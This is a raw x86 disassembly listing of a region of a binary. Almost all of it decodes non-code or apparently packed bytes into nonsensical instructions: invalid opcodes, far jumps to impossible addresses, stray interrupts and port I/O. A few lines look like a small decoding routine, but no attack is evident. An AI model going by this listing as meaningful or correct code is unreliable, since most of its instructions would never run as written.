  40f19d:	mov    edx,0x6ea5d99b
  40f1a2:	mov    al,ds:0x6016aaf7
  40f1a7:	out    0xda,al
  40f1a9:	mov    bh,BYTE PTR [esi+0x2b]
  40f1ac:	shl    ah,0xf5
  40f1af:	cmp    eax,0x2383164d
  40f1b4:	xor    DWORD PTR [ebp+0xb],eax
  40f1b7:	jecxz  0x40f1be
  40f1b9:	lods   eax,DWORD PTR ds:[esi]
  40f1ba:	int    0x91
  40f1bc:	not    BYTE PTR [ebx]
  40f1be:	add    DWORD PTR [edi],0xe6c65ebc
  40f1c4:	gs mov edi,0xb3b7732a
  40f1ca:	in     eax,dx
  40f1cb:	loopne 0x40f1c5
  40f1cd:	in     al,0x15
  40f1cf:	pop    edx
  40f1d0:	cmp    BYTE PTR [esi+0x1f1c7f6f],ah
  40f1d6:	lea    esp,[edi+edx*4-0x6d]
  40f1da:	dec    eax
  40f1db:	mov    ds:0xf8e1a23f,eax
  40f1e0:	xchg   ecx,eax
  40f1e1:	jns    0x40f16c
  40f1e3:	adc    eax,0x64b7cb0d
  40f1e8:	adc    ah,BYTE PTR [edi-0x40]
  40f1eb:	xor    bl,ch
  40f1ed:	sbb    WORD PTR [ebp+eiz*4+0x71741d43],sp
  40f1f5:	ins    BYTE PTR es:[edi],dx
  40f1f6:	sub    BYTE PTR [esi-0x1ced56ad],0xc
  40f1fd:	mov    ds:0xbff4e455,eax
  40f202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f203:	xlat   BYTE PTR ds:[ebx]
  40f204:	push   ebx
  40f205:	cmp    bh,BYTE PTR [edx-0x69084409]
  40f20b:	adc    BYTE PTR [edi],0x3a
  40f20e:	lahf   
  40f20f:	adc    bh,BYTE PTR [ebp-0x571a3988]
  40f215:	push   esi
  40f216:	leave  
  40f217:	pop    edx
  40f218:	add    ch,dl
  40f21a:	cmp    ch,BYTE PTR [ebp+0x69352be9]
  40f220:	ins    BYTE PTR es:[edi],dx
  40f221:	mov    eax,ds:0xea7d6a65
  40f226:	jbe    0x40f27c
  40f228:	ror    BYTE PTR [edi+0x5eed50c1],1
  40f22e:	hlt    
  40f22f:	xchg   edi,eax
  40f230:	popf   
  40f231:	popa   
  40f232:	lea    esi,[esi-0x33d0e90d]
  40f238:	mov    ah,0x9f
  40f23a:	shr    BYTE PTR [ecx+ebp*4-0x12f47752],0x17
  40f242:	pop    edx
  40f243:	adc    al,BYTE PTR [ebx+0x44c6ac02]
  40f249:	jmp    0x8da330f3
  40f24e:	sahf   
  40f24f:	imul   eax,DWORD PTR [edi+0xe5f62c5],0xffffffc0
  40f256:	push   ss
  40f257:	and    BYTE PTR [eax+0x4],al
  40f25a:	mov    ds:0x38737282,eax
  40f25f:	cmp    ah,BYTE PTR [ebx+0x5b]
  40f262:	int3   
  40f263:	ins    BYTE PTR es:[edi],dx
  40f264:	arpl   WORD PTR [edi-0x2],bx
  40f267:	fs sahf 
  40f269:	addr16 leave 
  40f26b:	push   eax
  40f26c:	cmp    ah,BYTE PTR [edx]
  40f26e:	mov    eax,ds:0x3c5898b5
  40f273:	jp     0x40f2f4
  40f275:	mov    fs:0x2ed253b7,al
  40f27b:	ficomp DWORD PTR [eax]
  40f27d:	sub    dl,bl
  40f27f:	nop
  40f280:	fwait
  40f281:	adc    al,0xb6
  40f283:	mov    bh,0x6b
  40f285:	mov    al,ds:0xe2a6ed22
  40f28a:	and    BYTE PTR [eax+0x56331613],ah
  40f290:	int    0xf3
  40f292:	dec    eax
  40f293:	loop   0x40f282
  40f295:	fcom   st(6)
  40f297:	inc    ebx
  40f298:	sbb    cl,BYTE PTR [esi-0x192289aa]
  40f29e:	sbb    al,0xe9
  40f2a0:	jno    0x40f29f
  40f2a2:	mov    ah,0x34
  40f2a4:	pop    esp
  40f2a5:	in     eax,0x7b
  40f2a7:	pop    esi
  40f2a8:	test   al,0xca
  40f2aa:	jecxz  0x40f2c2
  40f2ac:	and    eax,esp
  40f2ae:	lea    ebx,[ebx+ecx*8+0x6148f5bf]
  40f2b5:	mov    bl,0xab
  40f2b7:	(bad)
  40f2ba:	or     DWORD PTR [ebx+edx*8],edi
  40f2bd:	adc    esp,ecx
  40f2bf:	mov    bh,0x98
  40f2c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2c2:	jl     0x40f2ca
  40f2c4:	(bad)  
  40f2c5:	je     0x40f2f5
  40f2c7:	mov    bl,BYTE PTR [esi-0x68d93506]
  40f2cd:	adc    eax,0xb686f8e2
  40f2d2:	das    
  40f2d3:	leave  
  40f2d4:	push   edi
  40f2d5:	fst    st(2)
  40f2d7:	pop    ebp
  40f2d8:	xor    bh,bh
  40f2da:	hlt    
  40f2db:	dec    edi
  40f2dc:	popa   
  40f2dd:	bound  ecx,QWORD PTR [edx]
  40f2df:	sub    bl,BYTE PTR [edi]
  40f2e1:	aaa    
  40f2e2:	or     DWORD PTR [edx+0x32],ecx
  40f2e5:	sub    eax,0x18c1373e
  40f2ea:	and    edi,esi
  40f2ec:	adc    esi,DWORD PTR [eax-0x7a]
  40f2ef:	xchg   edi,eax
  40f2f0:	shl    ch,1
  40f2f2:	sub    al,0x4f
  40f2f4:	mov    ebx,0x7ebc4a81
  40f2f9:	popf   
  40f2fa:	mov    cl,0xac
  40f2fc:	mov    ds:0xceb49d75,eax
  40f301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f302:	cmp    esp,DWORD PTR [ebp+0x79f243ae]
  40f308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f309:	ror    bh,0x20
  40f30c:	fs stc 
  40f30e:	les    eax,FWORD PTR [edi]
  40f310:	shl    DWORD PTR [ebx-0x44],1
  40f313:	dec    ebp
  40f314:	sbb    al,ah
  40f316:	mov    esi,0x2f05d77d
  40f31b:	sbb    DWORD PTR [ecx+0x5568a238],esp
  40f321:	mov    ch,0xce
  40f323:	ins    BYTE PTR es:[edi],dx
  40f324:	aas    
  40f325:	and    al,0x8e
  40f327:	cmc    
  40f328:	div    esi
  40f32a:	dec    esp
  40f32b:	xchg   edi,eax
  40f32c:	mov    edx,0xc83d3e4b
  40f331:	cmp    DWORD PTR fs:[edi+0xb9128a2],esi
  40f338:	(bad)  [esi+edi*2-0x2c]
  40f33c:	int3   
  40f33d:	shl    BYTE PTR [eax+0x2fc562af],1
  40f343:	cs mov ebx,0xd1b8d3b1
  40f349:	inc    ebp
  40f34a:	imul   ebx,DWORD PTR [ebx],0x2dbd2536
  40f350:	(bad)  
  40f351:	out    dx,al
  40f352:	push   esi
  40f353:	mov    ebx,0x67017b4e
  40f358:	cmc    
  40f359:	mov    edi,0xa0839ff8
  40f35e:	pop    esp
  40f35f:	(bad)  
  40f360:	repnz leave 
  40f362:	leave  
  40f363:	out    0x10,al
  40f365:	pop    edx
  40f366:	xchg   edi,eax
  40f367:	push   edi
  40f368:	cmp    ch,BYTE PTR [esi+ebp*4-0x663d4839]
  40f36f:	inc    edx
  40f370:	fwait
  40f371:	sbb    ah,BYTE PTR [edi]
  40f373:	sar    BYTE PTR [ecx],cl
  40f375:	push   0x79
  40f377:	jnp    0x40f359
  40f379:	in     al,0xfc
  40f37b:	dec    esi
  40f37c:	popf   
  40f37d:	or     edi,DWORD PTR [ecx-0x62]
  40f380:	test   DWORD PTR [ebx-0x5db86b46],0x7cac05c2
  40f38a:	pop    DWORD PTR [esi]
  40f38c:	out    0xce,eax
  40f38e:	jmp    0x40f3e1
  40f390:	jl     0x40f39d
  40f392:	shl    WORD PTR [esi],1
  40f395:	sbb    eax,DWORD PTR [eax-0x12ee79da]
  40f39b:	pop    ebp
  40f39c:	es in  al,dx
  40f39e:	retf   0x5e5e
  40f3a1:	popf   
  40f3a2:	in     eax,dx
  40f3a3:	call   0x58a2:0x5344ce09
  40f3aa:	shr    DWORD PTR [eax-0x553cba21],cl
  40f3b0:	inc    esp
  40f3b1:	stos   BYTE PTR es:[edi],al
  40f3b2:	mov    esi,0x2c19a4e2
  40f3b7:	scas   eax,DWORD PTR es:[edi]
  40f3b8:	push   cs
  40f3b9:	lds    edx,FWORD PTR [eax]
  40f3bb:	fidiv  WORD PTR [edi]
  40f3bd:	clc    
  40f3be:	enter  0x1e50,0x6e
  40f3c2:	mov    ch,0x39
  40f3c4:	mov    al,ds:0x2c5a1cfa
  40f3c9:	fwait
  40f3ca:	dec    edx
  40f3cb:	or     eax,0x6175e21f
  40f3d0:	pop    edx
  40f3d1:	fldcw  WORD PTR [ebx+0x5a]
  40f3d4:	idiv   DWORD PTR [eax]
  40f3d6:	push   edi
  40f3d7:	push   ds
  40f3d8:	sbb    DWORD PTR [edi],eax
  40f3da:	adc    DWORD PTR ds:0x122b7a2d,0x4b789472
  40f3e4:	lea    esi,[ebx]
  40f3e6:	push   esi
  40f3e7:	mov    BYTE PTR ds:0xb6c26504,dl
  40f3ed:	xchg   ebp,eax
  40f3ee:	mov    ds:0x12456a91,al
  40f3f3:	mov    al,ds:0xf04eda71
  40f3f8:	mov    ch,0x31
  40f3fa:	dec    ebp
  40f3fb:	aam    0xd2
  40f3fd:	jno    0x40f3bc
  40f3ff:	cmp    bl,BYTE PTR [esi-0x55]
  40f402:	pop    edi
  40f403:	cmp    eax,0x52635e2f
  40f408:	imul   edx,ebp,0x8e678f52
  40f40e:	(bad)  
  40f410:	fs imul esp,edx,0xa2a5b9a8
  40f417:	and    BYTE PTR [ebx],0xce
  40f41a:	fmul   DWORD PTR [edi+0x291399e4]
  40f420:	ret    
  40f421:	mov    edx,0x92874c41
  40f426:	jecxz  0x40f42d
  40f428:	aam    0xdf
  40f42a:	or     al,BYTE PTR [edx+0x64]
  40f42d:	psubusb mm4,QWORD PTR [esi-0x41]
  40f431:	cdq    
  40f432:	nop
  40f433:	and    BYTE PTR [edi+0x12],dh
  40f436:	js     0x40f4a6
  40f438:	ret    
  40f439:	mov    DWORD PTR [eax],ebx
  40f43b:	xor    eax,0x7c176029
  40f440:	nop
  40f441:	pop    esp
  40f442:	inc    edi
  40f443:	xchg   ebp,eax
  40f444:	stos   DWORD PTR es:[edi],eax
  40f445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f446:	hlt    
  40f447:	ins    BYTE PTR es:[edi],dx
  40f448:	cmp    ah,BYTE PTR [ecx+edi*4-0x6b]
  40f44c:	cmp    edi,DWORD PTR [eax+0x49687930]
  40f452:	ins    BYTE PTR es:[edi],dx
  40f453:	jae    0x40f495
  40f455:	push   ecx
  40f456:	test   BYTE PTR [ebp+0x66],al
  40f459:	push   esp
  40f45a:	mov    DWORD PTR [edi+0x34657c2f],0x8340e4fc
  40f464:	dec    ebx
  40f465:	pusha  
  40f466:	outs   dx,DWORD PTR ds:[esi]
  40f467:	jmp    0x40f4a8
  40f469:	add    edi,DWORD PTR [ebp-0x18]
  40f46c:	pop    esi
  40f46d:	imul   BYTE PTR [edx]
  40f46f:	sub    al,0xdb
  40f471:	inc    ebx
  40f472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f473:	fnstcw WORD PTR [ecx+0x4d]
  40f476:	inc    ebp
  40f477:	aas    
  40f478:	xlat   BYTE PTR ds:[ebx]
  40f479:	stc    
  40f47a:	mov    es,WORD PTR [esi+0x1a6637a0]
  40f480:	jge    0x40f417
  40f482:	sub    al,0xd1
  40f484:	stos   DWORD PTR es:[edi],eax
  40f485:	sbb    al,0xfd
  40f487:	sti    
  40f488:	loop   0x40f422
  40f48a:	push   ss
  40f48b:	mov    ?,WORD PTR [eax+0x7c516469]
  40f491:	jae    0x40f45b
  40f493:	scas   eax,DWORD PTR es:[edi]
  40f494:	mov    edx,DWORD PTR [edx]
  40f496:	mov    esi,DWORD PTR ds:0x421cd2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421cd2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	add    ecx,edx
  40f4c6:	mov    ch,0xc6
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx+0x12]
  40f4d1:	test   al,0xed
  40f4d3:	ins    DWORD PTR es:[edi],dx
  40f4d4:	or     al,0xfb
  40f4d6:	shl    DWORD PTR [ecx+edi*1-0x44847f1f],1
  40f4dd:	cmc    
  40f4de:	femms  
  40f4e0:	jg     0x40f53d
  40f4e2:	pop    ss
  40f4e3:	and    bl,BYTE PTR [edx+0x5229f13a]
  40f4e9:	fsub   DWORD PTR [ebx]
  40f4eb:	call   0x5e8e:0xf34b08f9
  40f4f2:	mov    edx,0x623e1d49
  40f4f7:	ss pop eax
  40f4f9:	iret   
  40f4fa:	xchg   ebx,eax
  40f4fb:	jg     0x40f484
  40f4fd:	dec    ebp
  40f4fe:	rcr    ebx,cl
  40f500:	je     0x40f4cb
  40f502:	cmp    ecx,ebp
  40f504:	and    al,0xc
  40f506:	jnp    0x40f551
  40f508:	mov    BYTE PTR [ebp-0x6f2c6d4c],ah
  40f50e:	lock cmc 
  40f510:	xor    cl,0x3e
  40f513:	xor    DWORD PTR [esi-0x36fcc956],esp
  40f519:	ins    DWORD PTR es:[edi],dx
  40f51a:	cdq    
  40f51b:	push   es
  40f51c:	jae    0x40f594
  40f51e:	pop    esi
  40f51f:	test   ch,cl
  40f521:	neg    DWORD PTR [ebp-0x50]
  40f524:	in     al,dx
  40f525:	jb     0x40f4fd
  40f527:	cmp    esp,ebx
  40f529:	das    
  40f52a:	sti    
  40f52b:	pop    esi
  40f52c:	shl    edi,1
  40f52e:	out    dx,eax
  40f52f:	ficomp WORD PTR [edx-0x6f]
  40f532:	jne    0x40f510
  40f534:	leave  
  40f535:	je     0x40f4e7
  40f537:	cld    
  40f538:	inc    ebx
  40f539:	mov    cl,0xc
  40f53b:	arpl   WORD PTR [edx+0x110adc50],si
  40f541:	mov    ecx,0xa242404d
  40f546:	cs jl  0x40f542
  40f549:	mov    BYTE PTR [edx+0x344d31ad],dh
  40f54f:	push   esi
  40f550:	fistp  QWORD PTR [ebx+0x2f]
  40f553:	ret    
  40f554:	test   DWORD PTR es:[eax-0x7f],edx
  40f558:	jg     0x40f4df
  40f55a:	icebp  
  40f55b:	loopne 0x40f5b0
  40f55d:	adc    ebx,0xffffffa5
  40f560:	xchg   BYTE PTR [esi-0x3bb26bb5],ch
  40f566:	fsubr  st,st(6)
  40f568:	fucom  st(5)
  40f56a:	fstp   DWORD PTR [ebp+0x7e]
  40f56d:	bound  esp,QWORD PTR [edi-0x30]
  40f570:	mov    WORD PTR [esi-0x3e],cs
  40f573:	sub    DWORD PTR [edx+0x7b706d29],ebp
  40f579:	add    esi,DWORD PTR [edx-0x7a]
  40f57c:	jp     0x40f571
  40f57e:	aad    0x32
  40f580:	aas    
  40f581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f582:	push   ebp
  40f583:	cmp    al,0xb7
  40f585:	xor    DWORD PTR [edx],esi
  40f587:	dec    ebx
  40f588:	out    dx,al
  40f589:	rol    DWORD PTR [edx],cl
  40f58b:	pop    eax
  40f58c:	push   0xfb9fa5a0
  40f591:	cld    
  40f592:	push   0xffffff86
  40f594:	jne    0x40f5fc
  40f596:	push   esi
  40f597:	cli    
  40f598:	mov    bh,0xfe
  40f59a:	stos   BYTE PTR es:[edi],al
  40f59b:	loope  0x40f5a8
  40f59d:	std    
  40f59e:	sbb    ah,BYTE PTR [eax+0x1629a7f6]
  40f5a4:	or     ecx,DWORD PTR [esi]
  40f5a6:	scas   eax,DWORD PTR es:[edi]
  40f5a7:	test   eax,0xf324782b
  40f5ac:	mov    DWORD PTR [ecx+0x5f582cc8],edx
  40f5b2:	add    DWORD PTR [edx],ebx
  40f5b4:	aad    0xab
  40f5b6:	jmp    0x202d2f98
  40f5bb:	or     edi,edx
  40f5bd:	cmp    al,0xae
  40f5bf:	adc    esp,ecx
  40f5c1:	(bad)  
  40f5c2:	loopne 0x40f60e
  40f5c4:	dec    ebx
  40f5c5:	stc    
  40f5c6:	pushf  
  40f5c7:	cmp    al,0xe7
  40f5c9:	add    BYTE PTR ds:0xbdab9dd8,0xa8
  40f5d0:	imul   eax,ebx,0x791ccc73
  40f5d6:	pop    ecx
  40f5d7:	mov    ebx,DWORD PTR [edx+0x70]
  40f5da:	divps  xmm0,XMMWORD PTR [ebx-0x2da3e07f]
  40f5e1:	in     al,dx
  40f5e2:	leave  
  40f5e3:	neg    DWORD PTR [edx]
  40f5e5:	dec    ebp
  40f5e6:	data16 stos BYTE PTR es:[edi],al
  40f5e8:	ins    DWORD PTR es:[edi],dx
  40f5e9:	in     eax,dx
  40f5ea:	inc    edi
  40f5eb:	shl    DWORD PTR [esp+ecx*2],1
  40f5ee:	sub    BYTE PTR [edi-0x588edfe2],dh
  40f5f4:	call   0xaf2c6631
  40f5f9:	rol    DWORD PTR [esi-0x4ca57f06],1
  40f5ff:	mov    al,ds:0x5f1618be
  40f604:	sub    BYTE PTR [edi],0xa7
  40f607:	bound  ebp,QWORD PTR [eax]
  40f609:	xchg   edx,eax
  40f60a:	sub    al,0x7c
  40f60c:	lahf   
  40f60d:	adc    al,BYTE PTR [edx+0x59]
  40f610:	cli    
  40f611:	addr16 cwde 
  40f613:	jg     0x40f678
  40f615:	out    0x6d,eax
  40f617:	mov    WORD PTR [esi+0x3db52695],cs
  40f61d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f61e:	or     DWORD PTR [edi+esi*8-0x104f0dac],eax
  40f625:	in     eax,0xef
  40f627:	add    al,0x87
  40f629:	(bad)  
  40f62a:	pop    ds
  40f62b:	dec    esi
  40f62c:	xor    dl,dl
  40f62e:	dec    eax
  40f62f:	ds in  eax,dx
  40f631:	dec    ebp
  40f632:	pop    edx
  40f633:	xchg   BYTE PTR [edi-0x51b067b7],bh
  40f639:	adc    eax,eax
  40f63b:	sar    al,1
  40f63d:	add    bl,al
  40f63f:	loop   0x40f683
  40f641:	(bad)
  40f644:	push   esp
  40f645:	xor    BYTE PTR ds:0xc7007e9f,ah
  40f64b:	pop    ecx
  40f64c:	sub    BYTE PTR [esp+edi*2-0x69],ch
  40f650:	fsub   DWORD PTR [ebx+0x3dd51f80]
  40f656:	jne    0x40f673
  40f658:	inc    esi
  40f659:	mov    bh,0x63
  40f65b:	in     al,0xbb
  40f65d:	stc    
  40f65e:	fld    QWORD PTR [ebx]
  40f660:	xor    eax,0xfe7abcd0
  40f665:	aam    0xc7
  40f667:	dec    ch
  40f669:	cmp    ch,BYTE PTR [edx]
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	setb   BYTE PTR ds:[edx-0x2a]
  40f671:	mov    DWORD PTR [esi],edx
  40f673:	es xor edx,esi
  40f676:	mov    ch,0x28
  40f678:	jmp    0xb90d:0x2cd474e5
  40f67f:	in     eax,0x12
  40f681:	mov    esp,ebx
  40f683:	ins    BYTE PTR es:[edi],dx
  40f684:	arpl   WORD PTR [edi-0x1e],bx
  40f687:	cmp    eax,0x3dfca695
  40f68c:	mov    edx,0x579fe573
  40f691:	into   
  40f692:	fsubp  st(4),st
  40f694:	pop    ebx
  40f695:	addr16 imul edi,ebp,0x94799b31
  40f69c:	push   ds
  40f69d:	js     0x40f630
  40f69f:	jb     0x40f650
  40f6a1:	repnz xor ah,BYTE PTR [ebp+esi*4+0x8dd2e4c]
  40f6a9:	pushf  
  40f6aa:	jb     0x40f6d1
  40f6ac:	mov    al,ds:0xbd27ca96
  40f6b1:	int    0xb5
  40f6b3:	enter  0xef52,0x0
  40f6b7:	ret    
  40f6b8:	push   eax
  40f6b9:	inc    edx
  40f6ba:	js     0x40f65a
  40f6bc:	dec    eax
  40f6bd:	mov    bl,0xe8
  40f6bf:	stc    
  40f6c0:	and    eax,0x5587298d
  40f6c5:	hlt    
  40f6c6:	popa   
  40f6c7:	fs test al,0x57
  40f6ca:	push   ds
  40f6cb:	in     al,dx
  40f6cc:	pop    ebp
  40f6cd:	add    dh,BYTE PTR [esi+ecx*2]
  40f6d0:	mov    esp,0x18b2be19
  40f6d5:	mov    ebp,0x414a94fc
  40f6da:	out    dx,eax
  40f6db:	mov    esp,0x29ef2566
  40f6e0:	cmc    
  40f6e1:	mov    dh,0xd9
  40f6e3:	or     DWORD PTR [edi],esp
  40f6e5:	lahf   
  40f6e6:	xchg   ebp,eax
  40f6e7:	test   DWORD PTR [edx],ebp
  40f6e9:	jge    0x40f6cf
  40f6eb:	test   BYTE PTR [edi],cl
  40f6ed:	xor    DWORD PTR [edi+0x4b],esi
  40f6f0:	xchg   DWORD PTR [ebp-0x5914c8a9],edi
  40f6f6:	push   esi
  40f6f7:	cs popa 
  40f6f9:	test   BYTE PTR [edi+0x4b],dl
  40f6fc:	inc    ebx
  40f6fd:	mov    edi,0x23c2dad5
  40f702:	rol    DWORD PTR [ebx+ebp*4-0x1e],cl
  40f706:	dec    esi
  40f707:	mov    BYTE PTR ds:[edi-0x2a],0xc
  40f70c:	and    DWORD PTR [edx+0x235cfa6a],edi
  40f712:	daa    
  40f713:	jb     0x40f6dd
  40f715:	mov    BYTE PTR [esi+0x2697df48],cl
  40f71b:	jge    0x40f717
  40f71d:	rcr    DWORD PTR [edi+0x20fd24c1],0xda
  40f724:	or     DWORD PTR [edx],edi
  40f726:	sbb    DWORD PTR [ecx+0x27fbec1e],edi
  40f72c:	test   al,0x94
  40f72e:	push   edi
  40f72f:	mov    ebp,0x99d7ac46
  40f734:	(bad)
  40f737:	lods   al,BYTE PTR ds:[esi]
  40f738:	cli    
  40f739:	add    al,ch
  40f73b:	scas   eax,DWORD PTR es:[edi]
  40f73c:	dec    esp
  40f73d:	test   eax,0x2b4006bf
  40f742:	popf   
  40f743:	and    eax,0xe2fc66c6
  40f748:	shl    DWORD PTR [ebp+0xe],cl
  40f74b:	add    ebx,DWORD PTR [ecx+0x64dc3fe5]
  40f751:	ds jmp 0x334184ae
  40f757:	mov    cs,WORD PTR [ecx+0x4d60f62f]
  40f75d:	push   ebp
  40f75e:	fs xchg edx,eax
  40f760:	lock pop ss
  40f762:	adc    DWORD PTR [ebx-0x4e],ebp
  40f765:	pop    ecx
  40f766:	inc    edi
  40f767:	imul   esp,DWORD PTR [edi],0xfffffff0
  40f76a:	pusha  
  40f76b:	shr    BYTE PTR [esi],1
  40f76d:	adc    edx,DWORD PTR [esi+0x68f4bad1]
  40f773:	lahf   
  40f774:	scas   eax,DWORD PTR es:[edi]
  40f775:	mov    ebp,0x8ee275e1
  40f77a:	push   edi
  40f77b:	adc    dh,cl
  40f77d:	pushf  
  40f77e:	mov    edx,DWORD PTR [esi+0x7da48907]
  40f784:	(bad)  
  40f785:	push   0xdc4b6ef5
  40f78a:	scas   al,BYTE PTR es:[edi]
  40f78b:	enter  0xcaaa,0xf4
  40f78f:	retf   
  40f790:	icebp  
  40f791:	adc    al,0xd6
  40f793:	or     esi,0xffffffe7
  40f796:	jno    0x40f73a
  40f798:	add    edx,DWORD PTR [edx+0x68]
  40f79b:	out    dx,al
  40f79c:	imul   ebp,DWORD PTR [edx],0xffffffe1
  40f79f:	call   edx
  40f7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7a2:	adc    al,0x72
  40f7a4:	mov    al,ds:0x3b2cc858
  40f7a9:	mov    BYTE PTR [eax],cl
  40f7ab:	or     eax,0x7498eba9
  40f7b0:	clc    
  40f7b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7b2:	outs   dx,DWORD PTR ds:[esi]
  40f7b3:	and    ebp,esp
  40f7b5:	fs test eax,0x1d9325d1
  40f7bb:	sti    
  40f7bc:	or     eax,0x30760ea0
  40f7c1:	push   es
  40f7c2:	mov    dh,0xb4
  40f7c4:	call   0xe4c6:0xb30ff1a5
  40f7cb:	mov    bh,BYTE PTR [eax-0x6ae59361]
  40f7d1:	fist   WORD PTR [ebx-0x47407e63]
  40f7d7:	xchg   ebx,eax
  40f7d8:	push   cs
  40f7d9:	xor    ah,BYTE PTR [esi]
  40f7db:	push   0xe6a898aa
  40f7e0:	or     eax,0x373374f7
  40f7e5:	push   0x9a80af7c
  40f7ea:	in     eax,dx
  40f7eb:	ret    
  40f7ec:	xlat   BYTE PTR ds:[ebx]
  40f7ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ee:	in     al,dx
  40f7ef:	cdq    
  40f7f0:	inc    ecx
  40f7f1:	shl    BYTE PTR [edi+0x42],1
  40f7f4:	mov    ecx,0xa4103d8b
  40f7f9:	outs   dx,DWORD PTR ds:[esi]
  40f7fa:	and    edx,DWORD PTR [ebp+0x69]
  40f7fd:	cmp    eax,0xb662c657
  40f802:	xchg   ebp,eax
  40f803:	push   ebp
  40f804:	add    al,0x60
  40f806:	or     bh,BYTE PTR [ebx-0x38dc84a6]
  40f80c:	xchg   ecx,eax
  40f80d:	adc    ebp,DWORD PTR [esi]
  40f80f:	dec    esi
  40f810:	loope  0x40f7a3
  40f812:	arpl   WORD PTR [ebx+0x569ee7ef],sp
  40f818:	not    BYTE PTR [ebx]
  40f81a:	add    BYTE PTR [edx-0x162acdfe],bl
  40f820:	mov    al,0xf5
  40f822:	inc    edx
  40f823:	pop    eax
  40f824:	xchg   esp,eax
  40f825:	call   0x30a34eed
  40f82a:	sub    BYTE PTR [ebx],ch
  40f82c:	jmp    0x16bb8787
  40f831:	cmp    DWORD PTR [edi+0x40],esi
  40f834:	push   cs
  40f835:	push   ebx
  40f836:	push   ebp
  40f837:	sbb    ebx,ebp
  40f839:	pop    ds
  40f83a:	repz cmp eax,0x65de4ca9
  40f840:	jne    0x40f7c9
  40f842:	push   edi
  40f843:	inc    edi
  40f844:	das    
  40f845:	adc    eax,0x2715693a
  40f84a:	dec    esp
  40f84b:	stc    
  40f84c:	scas   eax,DWORD PTR es:[edi]
  40f84d:	or     ch,BYTE PTR [esi-0xbf7e19c]
  40f853:	sti    
  40f854:	pop    esi
  40f855:	inc    esi
  40f856:	bound  esp,QWORD PTR [esi+0x621fcda0]
  40f85c:	jno    0x40f7df
  40f85e:	sub    BYTE PTR [edi-0x48],dl
  40f861:	sub    DWORD PTR [eax-0x4b],eax
  40f864:	and    eax,0x3092b5df
  40f869:	fist   WORD PTR [ebp+0x69]
  40f86c:	int    0x2b
  40f86e:	add    esp,ecx
  40f870:	dec    edx
  40f871:	bound  ebx,QWORD PTR [ecx+0x1b]
  40f874:	adc    BYTE PTR [esi+0xa180480],0x64
  40f87b:	stos   DWORD PTR es:[edi],eax
  40f87c:	mov    ebx,0xeb3c4130
  40f881:	sub    DWORD PTR [edx+0x759099a4],0x52e3fbe5
  40f88b:	mov    ah,0xa
  40f88d:	adc    DWORD PTR [esi+0x14],eax
  40f890:	push   es
  40f891:	push   ebp
  40f892:	mov    bl,BYTE PTR [edx-0x39631b68]
  40f898:	retf   0x5ec7
  40f89b:	adc    esp,edi
  40f89d:	xchg   BYTE PTR [edx+0xd],dh
  40f8a0:	jge    0x40f887
  40f8a2:	call   0xde1b:0x9c3396dd
  40f8a9:	cdq    
  40f8aa:	test   DWORD PTR [esi+0x2],0x519b8acf
  40f8b1:	inc    edi
  40f8b2:	and    al,0xb8
  40f8b4:	repnz sbb eax,DWORD PTR [esi-0x3935061d]
  40f8bb:	push   ebp
  40f8bc:	dec    ebx
  40f8bd:	dec    edi
  40f8be:	loope  0x40f8f1
  40f8c0:	fadd   QWORD PTR [eax-0x18d784ab]
  40f8c6:	sub    eax,0x7668f936
  40f8cb:	nop
  40f8cc:	out    0x3f,eax
  40f8ce:	scas   eax,DWORD PTR es:[edi]
  40f8cf:	lods   eax,DWORD PTR ds:[esi]
  40f8d0:	pop    ebp
  40f8d1:	adc    al,0x21
  40f8d3:	fstp   QWORD PTR [ecx+0x65214108]
  40f8d9:	out    0x97,al
  40f8db:	push   esi
  40f8dc:	pop    eax
  40f8dd:	push   cs
  40f8de:	xchg   esp,eax
  40f8df:	data16 jge 0x40f95f
  40f8e2:	xchg   BYTE PTR [edx+ecx*1],ch
  40f8e5:	imul   eax,DWORD PTR [edx],0xffffffe4
  40f8e8:	hlt    
  40f8e9:	push   esi
  40f8ea:	jb     0x40f8ee
  40f8ec:	xlat   BYTE PTR ds:[ebx]
  40f8ed:	sbb    BYTE PTR [edx],bh
  40f8ef:	int    0x7
  40f8f1:	scas   eax,DWORD PTR es:[edi]
  40f8f2:	push   es
  40f8f3:	sti    
  40f8f4:	cmp    BYTE PTR [esi],al
  40f8f6:	daa    
  40f8f7:	les    esp,FWORD PTR [ebx]
  40f8f9:	fldcw  WORD PTR [ebx+0x30785949]
  40f8ff:	jge    0x40f892
  40f901:	ins    DWORD PTR es:[edi],dx
  40f902:	test   ecx,ebp
  40f904:	cmp    eax,0x9e2bbbc2
  40f909:	dec    ecx
  40f90a:	loopne 0x40f92c
  40f90c:	pop    esp
  40f90d:	in     al,0x29
  40f90f:	adc    eax,0xac6a3f9d
  40f914:	fidiv  DWORD PTR [esi-0x5218c77c]
  40f91a:	pop    ecx
  40f91b:	cmp    ch,BYTE PTR ds:0xe54dc3c6
  40f921:	test   BYTE PTR [edx],ah
  40f923:	fnstenv [ecx-0x72f05ee0]
  40f929:	repnz addr16 xor eax,0x7635e27b
